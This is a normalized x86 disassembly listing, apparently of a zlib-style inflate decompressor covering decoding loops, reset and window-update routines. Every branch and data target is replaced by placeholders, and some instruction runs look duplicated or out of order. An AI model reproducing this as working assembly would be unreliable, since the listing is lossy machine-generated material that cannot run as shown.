and edx [ esp + 0x28 ]
add eax edx
mov ecx esi
shr [ esp + 0x28 ] cl
sub [ esp + 0x2c ] esi
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
mov eax [ esp + 0x8 ]
sub eax [ esp + 0xc ]
mov ecx 0x5
sub ecx eax
mov ecx [ esp + 0xc ]
sub ecx [ esp + 0x8 ]
add ecx 0x5
jmp r-xdata
cmp [ esp + 0x2c ] 0xf
jae r-xdata
test esi 0x40
jne r-xdata
movzx edi [ esp + 0x42 ]
and esi 0xf
cmp esi [ esp + 0x2c ]
jbe r-xdata
sub ebx [ esp + 0x14 ]
mov eax 0x101
sub eax ebx
mov eax [ esp + 0x14 ]
sub eax ebx
add eax 0x101
jmp r-xdata
mov edx [ esp ]
mov [ edx + 0x4 ] ecx
cmp ebx [ esp + 0x14 ]
jae r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov eax [ esp + 0x4 ]
mov [ eax ] 0x12
jmp r-xdata
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and edx [ esp + 0x28 ]
movzx ecx [ esp + 0x42 ]
add edx ecx
mov ecx [ esp + 0x34 ]
mov edx [ ecx + edx * 4 ]
mov [ esp + 0x40 ] edx
jmp r-xdata
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
mov ecx esi
and edx [ esp + 0x28 ]
shr [ esp + 0x28 ] cl
sub [ esp + 0x2c ] esi
mov esi ebx
sub esi [ esp + 0x10 ]
add edi edx
cmp esi edi
jae r-xdata
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
cmp esi [ esp + 0x2c ]
jbe r-xdata
mov edx [ esp ]
mov [ edx + 0x10 ] eax
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x28 ]
mov [ ecx + 0x34 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x2c ]
mov [ edx + 0x38 ] ecx
add esp 0x44
pop edi
pop esi
pop ebx
retn
movzx esi [ esp + 0x41 ]
mov ecx esi
shr [ esp + 0x28 ] cl
sub [ esp + 0x2c ] esi
movzx esi [ esp + 0x40 ]
test esi 0x10
je r-xdata
mov edx ebx
sub edx edi
mov edx edi
sub edx esi
mov esi edx
cmp esi [ esp + 0x1c ]
jbe r-xdata
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
inc edx
inc ebx
mov cl [ edx ]
inc edx
mov [ ebx ] cl
inc ebx
mov cl [ edx ]
inc edx
mov [ ebx ] cl
inc ebx
mov cl [ edx ]
sub eax 0x3
mov [ ebx ] cl
cmp eax 0x2
ja r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
dec edx
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov ecx [ esp + 0x4 ]
mov [ ecx ] 0x12
jmp r-xdata
inc edx
inc ebx
cmp eax 0x1
mov cl [ edx ]
mov [ ebx ] cl
jbe r-xdata
cmp esi [ esp + 0x20 ]
jbe r-xdata
mov ecx [ esp + 0x18 ]
sub ecx esi
add edx ecx
cmp eax esi
jbe r-xdata
inc ebx
inc edx
mov al [ edx ]
mov [ ebx ] al
jmp r-xdata
mov ecx [ esp + 0x20 ]
sub ecx esi
add edx ecx
cmp eax esi
jbe r-xdata
mov ecx [ esp + 0x18 ]
add ecx [ esp + 0x20 ]
sub ecx esi
add edx ecx
sub esi [ esp + 0x20 ]
cmp eax esi
jbe r-xdata
cmp eax 0x2
jbe r-xdata
sub eax esi
sub eax esi
sub eax esi
test eax eax
je r-xdata
inc edx
inc ebx
mov cl [ edx ]
inc edx
mov [ ebx ] cl
inc ebx
mov cl [ edx ]
inc edx
mov [ ebx ] cl
inc ebx
mov cl [ edx ]
sub eax 0x3
mov [ ebx ] cl
cmp eax 0x2
ja r-xdata
inc ebx
inc edx
mov cl [ edx ]
mov [ ebx ] cl
dec esi
jne r-xdata
mov edx ebx
sub edx edi
jmp r-xdata
inc ebx
inc edx
mov cl [ edx ]
mov [ ebx ] cl
dec esi
jne r-xdata
mov edx ebx
sub edx edi
inc ebx
inc edx
mov cl [ edx ]
mov [ ebx ] cl
dec esi
jne r-xdata
mov edx [ esp + 0x24 ]
dec edx
cmp eax [ esp + 0x20 ]
jbe r-xdata
inc edx
inc ebx
cmp eax 0x1
mov cl [ edx ]
mov [ ebx ] cl
jbe r-xdata
mov esi [ esp + 0x20 ]
sub eax esi
inc ebx
inc edx
mov al [ edx ]
mov [ ebx ] al
jmp r-xdata
inc ebx
inc edx
mov cl [ edx ]
mov [ ebx ] cl
dec esi
jne r-xdata
mov edx ebx
sub edx edi
jmp r-xdata
sub_4698d8
test eax eax
je r-xdata
mov eax 0xfffffffe
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov edx [ eax + 0x1c ]
xor ecx ecx
mov [ edx + 0x1c ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
mov [ eax + 0x18 ] ecx
xor ecx ecx
mov [ eax + 0x30 ] 0x1
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x4 ] eax
mov [ edx + 0xc ] ecx
mov [ edx + 0x14 ] 0x8000
xor eax eax
xor ecx ecx
mov [ edx + 0x24 ] eax
xor eax eax
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] eax
xor ecx ecx
xor eax eax
mov [ edx + 0x34 ] ecx
lea ecx [ edx + 0x52c ]
mov [ edx + 0x38 ] eax
mov [ edx + 0x68 ] ecx
mov [ edx + 0x4c ] ecx
mov [ edx + 0x48 ] ecx
xor eax eax
retn
sub_469944
push ebx
push esi
mov ebx ecx
test eax eax
je r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
cmp edx 0x10
jg r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
mov ecx [ eax + 0x38 ]
add ecx edx
cmp ecx 0x20
jbe r-xdata
mov ecx edx
mov esi 0x1
shl esi cl
dec esi
and ebx esi
mov ecx [ eax + 0x38 ]
shl ebx cl
add [ eax + 0x34 ] ebx
add [ eax + 0x38 ] edx
xor eax eax
pop esi
pop ebx
retn
sub_469990
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ecx ecx
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov al [ ecx ]
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x38
je r-xdata
test ebx ebx
jne r-xdata
xor edx edx
mov [ ebx + 0x18 ] edx
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov [ ebx + 0x20 ] r-xdata
xor ecx ecx
mov [ ebx + 0x28 ] ecx
mov ecx 0x252c
mov edx 0x1
mov eax [ ebx + 0x28 ]
call [ ebx + 0x20 ]
test eax eax
jne r-xdata
mov [ ebx + 0x24 ] sub_4676b4
mov [ ebx + 0x1c ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
inc ecx
mov [ eax + 0x8 ] ecx
xor edx edx
mov [ eax + 0x8 ] edx
neg [ ebp - 0x4 ]
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor ecx ecx
mov eax 0xfffffffe
mov [ ebx + 0x1c ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0xf
jle r-xdata
cmp [ ebp - 0x4 ] 0x8
jl r-xdata
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x30 ] ecx
mov eax ebx
call sub_4698d8
sub_469a8c
push ebx
push esi
push edi
push ecx
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x1c ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x20 ]
mov edx 0x1
shl edx cl
mov eax [ esp ]
mov esi [ esp ]
mov ecx 0x1
mov eax [ eax + 0x28 ]
call [ esi + 0x20 ]
mov esi eax
mov [ ebx + 0x30 ] esi
test esi esi
jne r-xdata
mov ecx [ esp ]
mov esi edi
sub esi [ ecx + 0x10 ]
mov eax [ ebx + 0x24 ]
cmp esi eax
jb r-xdata
mov ecx [ ebx + 0x20 ]
mov edx 0x1
shl edx cl
mov [ ebx + 0x24 ] edx
xor eax eax
mov [ ebx + 0x2c ] eax
xor edx edx
mov [ ebx + 0x28 ] edx
mov eax 0x1
jmp r-xdata
mov edi [ ebx + 0x24 ]
mov eax [ ebx + 0x2c ]
sub edi eax
cmp esi edi
jae r-xdata
push eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0xc ]
sub ecx eax
push ecx
mov eax [ ebx + 0x30 ]
push eax
call sub_4676d0
add esp 0xc
xor edx edx
mov [ ebx + 0x2c ] edx
mov ecx [ ebx + 0x24 ]
mov [ ebx + 0x28 ] ecx
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
push edi
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0xc ]
sub ecx esi
push ecx
mov edx [ ebx + 0x30 ]
add edx eax
push edx
call sub_4676d0
add esp 0xc
sub esi edi
test esi esi
je r-xdata
mov edi esi
xor eax eax
add [ ebx + 0x2c ] edi
mov ecx [ ebx + 0x2c ]
cmp ecx [ ebx + 0x24 ]
jne r-xdata
push esi
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
sub ecx esi
push ecx
mov eax [ ebx + 0x30 ]
push eax
call sub_4676d0
add esp 0xc
mov [ ebx + 0x2c ] esi
mov edx [ ebx + 0x24 ]
mov [ ebx + 0x28 ] edx
jmp r-xdata
mov edx [ ebx + 0x28 ]
cmp edx [ ebx + 0x24 ]
jae r-xdata
xor eax eax
mov [ ebx + 0x2c ] eax
add [ ebx + 0x28 ] edi
sub_469b90
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
cmp [ edx + 0xc ] 0x0
je r-xdata
mov ecx [ esp ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ esp ]
mov esi [ edx + 0x1c ]
cmp [ esi ] 0x3
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0xc ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
mov [ esp + 0xc ] eax
mov eax [ esp ]
mov edx [ esp ]
mov edi [ eax + 0x4 ]
mov eax [ esi + 0x34 ]
mov ebp [ edx ]
mov [ esp + 0x10 ] eax
mov ebx [ esi + 0x38 ]
mov [ esp + 0x14 ] edi
xor edx edx
mov eax [ esp + 0xc ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] edx
mov [ esi ] 0x4
mov eax 0xfffffffe
jmp r-xdata
jmp [ ecx * 4 + jump_table_469c2f ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp ebx 0x20
jae r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esp + 0x4 ] 0x5
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax ebx
and eax 0x7
mov ecx eax
shr [ esp + 0x10 ] cl
sub ebx eax
cmp ebx 0x20
jae r-xdata
mov eax [ esi + 0x3c ]
mov [ esp + 0x1c ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
cmp ebx 0xe
jae r-xdata
mov edx [ esi + 0x64 ]
cmp edx [ esi + 0x58 ]
jb r-xdata
mov eax [ esi + 0x5c ]
add eax [ esi + 0x60 ]
cmp eax [ esi + 0x64 ]
ja r-xdata
cmp edi 0x6
jb r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov ecx [ esi + 0x54 ]
mov eax 0x1
shl eax cl
dec eax
and eax [ esp + 0x10 ]
mov edx [ esi + 0x4c ]
mov eax [ edx + eax * 4 ]
mov [ esp + 0x20 ] eax
xor edx edx
mov dl [ esp + 0x21 ]
cmp ebx edx
jae r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov [ esp + 0x28 ] 0x1
jmp r-xdata
mov [ esp + 0x28 ] 0xfffffffd
jmp r-xdata
mov eax 0xfffffffc
jmp r-xdata
cmp ebx 0x10
jae r-xdata
mov [ esi ] 0x4
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
shr eax 0x8
mov ecx [ esp + 0x10 ]
shr edx 0x18
and eax 0xff00
and edx 0xff
and ecx 0xff00
add edx eax
mov eax [ esp + 0x10 ]
and eax 0xff
shl ecx 0x8
shl eax 0x18
add edx ecx
add edx eax
mov [ esi + 0x18 ] edx
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
xor eax eax
xor ebx ebx
mov [ esp + 0x10 ] eax
mov [ esi ] 0x2
test edi edi
je r-xdata
xor ecx ecx
xor edx edx
xor eax eax
call sub_46797c
mov [ esi + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov [ esi ] 0x3
mov eax [ esp ]
mov edx [ esp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ esp ]
mov [ edx ] ebp
mov ecx [ esp ]
mov [ ecx + 0x4 ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] ebx
mov eax 0x2
jmp r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov [ eax + 0x10 ] edx
mov ecx [ esp ]
mov [ ecx ] ebp
mov eax [ esp ]
mov [ eax + 0x4 ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x34 ] edx
mov [ esi + 0x38 ] ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
cmp ebx 0x3
jae r-xdata
mov ecx ebx
mov eax ebx
and ecx 0x7
and eax 0x7
shr [ esp + 0x10 ] cl
sub ebx eax
mov [ esi ] 0x10
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
shr edx 0x10
and eax 0xffff
xor edx 0xffff
cmp eax edx
je r-xdata
test edi edi
je r-xdata
mov [ esi ] 0x3
jmp r-xdata
cmp edi [ esp + 0x1c ]
jae r-xdata
mov edx [ esp + 0x10 ]
and edx 0x1f
add edx 0x101
mov [ esi + 0x5c ] edx
shr [ esp + 0x10 ] 0x5
sub ebx 0x5
mov ecx [ esp + 0x10 ]
and ecx 0x1f
inc ecx
mov [ esi + 0x60 ] ecx
shr [ esp + 0x10 ] 0x5
sub ebx 0x5
mov eax [ esp + 0x10 ]
and eax 0xf
add eax 0x4
mov [ esi + 0x58 ] eax
shr [ esp + 0x10 ] 0x4
sub ebx 0x4
cmp [ esi + 0x5c ] 0x11e
ja r-xdata
test edi edi
je r-xdata
cmp ebx 0x3
jae r-xdata
jmp r-xdata
mov ecx [ esi + 0x50 ]
mov eax 0x1
shl eax cl
dec eax
and eax [ esp + 0x10 ]
mov edx [ esi + 0x48 ]
mov eax [ edx + eax * 4 ]
mov [ esp + 0x20 ] eax
xor edx edx
mov dl [ esp + 0x21 ]
cmp ebx edx
jae r-xdata
cmp [ esi ] 0x12
je r-xdata
mov ecx [ esi + 0x50 ]
mov eax 0x1
shl eax cl
dec eax
and eax [ esp + 0x10 ]
mov edx [ esi + 0x48 ]
mov eax [ edx + eax * 4 ]
mov [ esp + 0x20 ] eax
xor edx edx
mov dl [ esp + 0x21 ]
cmp ebx edx
jae r-xdata
cmp [ esp + 0xc ] 0x102
jb r-xdata
mov [ esi ] 0xc
jmp r-xdata
test [ esp + 0x20 ] 0xf0
jne r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x28 ]
add eax [ esp + 0x18 ]
sub eax [ esp + 0xc ]
cmp eax [ esi + 0x40 ]
jae r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
sub eax [ esp + 0xc ]
mov [ esp + 0x1c ] eax
mov edx [ esi + 0x40 ]
cmp edx [ esp + 0x1c ]
jbe r-xdata
mov eax [ esp + 0x8 ]
mov cl [ esi + 0x3c ]
mov [ eax ] cl
inc [ esp + 0x8 ]
dec [ esp + 0xc ]
mov [ esi ] 0xa
jmp r-xdata
mov [ esi ] 0x11
cmp ebx 0x20
jae r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
and eax 0xff
mov ecx 0x1f
shr edx 0x8
shl eax 0x8
add eax edx
xor edx edx
div ecx
test edx edx
je r-xdata
test edi edi
je r-xdata
mov ecx [ esi ]
cmp ecx 0x14
ja r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0x20
jb r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp ]
call sub_469a8c
test eax eax
je r-xdata
cmp [ esi ] 0x10
jge r-xdata
mov eax [ esp + 0x10 ]
and eax 0x1
mov [ esi + 0x4 ] eax
shr [ esp + 0x10 ] 0x1
dec ebx
mov edx [ esp + 0x10 ]
and edx 0x3
sub edx 0x1
jb r-xdata
test edi edi
je r-xdata
mov [ esi + 0x3c ] eax
xor eax eax
xor ebx ebx
mov [ esp + 0x10 ] eax
mov [ esi ] 0x6
mov ecx [ esp ]
mov [ ecx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0x20
jb r-xdata
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x1c ] edi
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
cmp [ esi + 0x60 ] 0x1e
jbe r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0xe
jb r-xdata
mov dx [ esp + 0x10 ]
mov eax [ esi + 0x64 ]
and dx 0x7
inc [ esi + 0x64 ]
movzx ecx [ eax * 2 + rw-data ]
mov [ esi + ecx * 2 + 0x6c ] dx
shr [ esp + 0x10 ] 0x3
sub ebx 0x3
test edi edi
je r-xdata
cmp [ esi + 0x64 ] 0x13
jb r-xdata
movzx edx [ esp + 0x22 ]
cmp edx 0x10
jge r-xdata
test edi edi
je r-xdata
lea eax [ esi + 0x52c ]
lea edx [ esi + 0x68 ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x50 ] 0x9
push edx
lea ecx [ esi + 0x50 ]
push ecx
lea eax [ esi + 0x2ec ]
push eax
mov eax 0x1
mov ecx [ esi + 0x5c ]
lea edx [ esi + 0x6c ]
call sub_46adbc
mov [ esp + 0x28 ] eax
cmp [ esp + 0x28 ] 0x0
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov [ eax + 0x10 ] edx
mov ecx [ esp ]
mov [ ecx ] ebp
mov eax [ esp ]
mov [ eax + 0x4 ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x34 ] edx
mov [ esi + 0x38 ] ebx
mov edx [ esp + 0x18 ]
mov eax [ esp ]
call sub_4693dc
mov ecx [ esp ]
mov eax [ ecx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov ebp [ eax ]
mov eax [ esp ]
mov edi [ eax + 0x4 ]
mov eax [ esi + 0x34 ]
mov [ esp + 0x10 ] eax
mov ebx [ esi + 0x38 ]
jmp r-xdata
cmp ebx [ esi + 0x44 ]
jb r-xdata
mov cl [ esp + 0x21 ]
xor eax eax
shr [ esp + 0x10 ] cl
mov al [ esp + 0x21 ]
sub ebx eax
test [ esp + 0x20 ] 0x40
je r-xdata
mov edx [ esp + 0x20 ]
mov [ esp + 0x24 ] edx
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
jmp r-xdata
mov [ esi ] 0xe
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
cmp ebx [ esi + 0x44 ]
jb r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x3c ]
sub eax [ esi + 0x40 ]
mov [ esp + 0x1c ] edx
mov ecx [ esi + 0x40 ]
sub ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
mov eax [ esi + 0x2c ]
cmp eax [ esp + 0x1c ]
jae r-xdata
mov edx [ esp + 0xc ]
sub [ esp + 0x18 ] edx
mov eax [ esp ]
mov edx [ esp + 0x18 ]
add [ eax + 0x14 ] edx
mov ecx [ esp + 0x18 ]
add [ esi + 0x1c ] ecx
cmp [ esp + 0x18 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
and eax 0xf
cmp eax 0x8
je r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0x10
jb r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x4 ]
sub [ esp + 0x14 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x10 ]
sub [ esp + 0x18 ] edx
mov ecx [ esp ]
mov eax [ esp + 0x14 ]
add [ ecx + 0x8 ] eax
mov edx [ esp ]
mov ecx [ esp + 0x18 ]
add [ edx + 0x14 ] ecx
mov eax [ esp + 0x18 ]
add [ esi + 0x1c ] eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov [ esi ] 0x13
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
cmp eax [ esp + 0x18 ]
je r-xdata
mov [ esi ] 0x5
jmp r-xdata
je r-xdata
xor edx edx
mov ecx ebx
mov dl [ ebp ]
inc ebp
shl edx cl
add [ esp + 0x10 ] edx
dec edi
add ebx 0x8
cmp ebx 0x3
jb r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
mov [ esp + 0x1c ] ecx
xor ecx ecx
mov [ esi + 0x64 ] ecx
mov [ esi ] 0x8
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0x3
jb r-xdata
mov eax [ esi + 0x64 ]
inc [ esi + 0x64 ]
movzx edx [ eax * 2 + rw-data ]
mov [ esi + edx * 2 + 0x6c ] 0x0
lea eax [ esi + 0x52c ]
lea edx [ esi + 0x68 ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x50 ] 0x7
push edx
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x2ec ]
push ecx
push eax
xor eax eax
mov ecx 0x13
lea edx [ esi + 0x6c ]
call sub_46adbc
mov [ esp + 0x28 ] eax
cmp [ esp + 0x28 ] 0x0
je r-xdata
movzx ecx [ esp + 0x22 ]
cmp ecx 0x10
jne r-xdata
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
jmp r-xdata
mov ecx [ esi + 0x68 ]
lea eax [ esi + 0x68 ]
mov [ esi + 0x4c ] ecx
lea edx [ esi + 0x54 ]
mov [ esi + 0x54 ] 0x6
push eax
push edx
lea ecx [ esi + 0x2ec ]
mov eax 0x2
push ecx
mov edx [ esi + 0x5c ]
mov ecx [ esi + 0x60 ]
add edx edx
add edx esi
add edx 0x6c
call sub_46adbc
mov [ esp + 0x28 ] eax
cmp [ esp + 0x28 ] 0x0
je r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
mov cl [ esp + 0x21 ]
xor eax eax
shr [ esp + 0x10 ] cl
mov al [ esp + 0x21 ]
sub ebx eax
movzx edx [ esp + 0x22 ]
mov [ esi + 0x3c ] edx
cmp [ esp + 0x20 ] 0x0
jne r-xdata
test [ esp + 0x20 ] 0xf0
jne r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ esi + 0x44 ]
mov edx 0x1
shl edx cl
dec edx
and edx [ esp + 0x10 ]
add [ esi + 0x3c ] edx
mov ecx [ esi + 0x44 ]
shr [ esp + 0x10 ] cl
sub ebx [ esi + 0x44 ]
movzx eax [ esp + 0x22 ]
mov [ esi + 0x40 ] eax
xor edx edx
mov dl [ esp + 0x20 ]
and edx 0xf
mov [ esi + 0x44 ] edx
mov [ esi ] 0xd
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
mov cl [ esp + 0x25 ]
xor edx edx
shr [ esp + 0x10 ] cl
mov dl [ esp + 0x25 ]
sub ebx edx
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ esi + 0x44 ]
mov edx 0x1
shl edx cl
dec edx
and edx [ esp + 0x10 ]
add [ esi + 0x40 ] edx
mov ecx [ esi + 0x44 ]
shr [ esp + 0x10 ] cl
sub ebx [ esi + 0x44 ]
mov ecx [ esp + 0x1c ]
sub [ esp + 0xc ] ecx
mov edx [ esp + 0x1c ]
sub [ esi + 0x3c ] edx
mov edx [ esp + 0xc ]
mov [ esp + 0x1c ] edx
sub eax [ esp + 0x1c ]
add eax [ esi + 0x30 ]
sub [ esp + 0x1c ] eax
mov eax [ esi + 0x24 ]
sub eax [ esp + 0x1c ]
add eax [ esi + 0x30 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
shr edx 0x8
mov ecx [ esp + 0x10 ]
shr eax 0x18
and edx 0xff00
and eax 0xff
and ecx 0xff00
add eax edx
mov edx [ esp + 0x10 ]
shl ecx 0x8
and edx 0xff
shl edx 0x18
add eax ecx
add eax edx
cmp eax [ esi + 0x18 ]
je r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
mov eax [ esi + 0x18 ]
call sub_46797c
mov [ esi + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
cmp ebx 0x20
jb r-xdata
shr [ esp + 0x10 ] 0x4
sub ebx 0x4
mov eax [ esp + 0x10 ]
and eax 0xf
add eax 0x8
cmp eax [ esi + 0x20 ]
jbe r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
shr [ esp + 0x10 ] 0x2
sub ebx 0x2
jmp r-xdata
mov eax esi
call sub_469a6c
mov [ esi ] 0xa
jmp r-xdata
dec edx
je r-xdata
mov eax [ esp + 0x1c ]
push eax
push ebp
mov edx [ esp + 0x10 ]
push edx
call sub_4676d0
add esp 0xc
sub edi [ esp + 0x1c ]
add ebp [ esp + 0x1c ]
mov ecx [ esp + 0x1c ]
sub [ esp + 0xc ] ecx
mov eax [ esp + 0x1c ]
add [ esp + 0x8 ] eax
mov edx [ esp + 0x1c ]
sub [ esi + 0x3c ] edx
jmp r-xdata
xor ecx ecx
mov [ esi + 0x64 ] ecx
mov [ esi ] 0x9
jmp r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
movzx ecx [ esp + 0x22 ]
cmp ecx 0x11
jne r-xdata
jmp r-xdata
xor edx edx
mov dl [ esp + 0x21 ]
cmp ebx edx
jb r-xdata
mov [ esi ] 0xa
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
test [ esp + 0x20 ] 0x20
je r-xdata
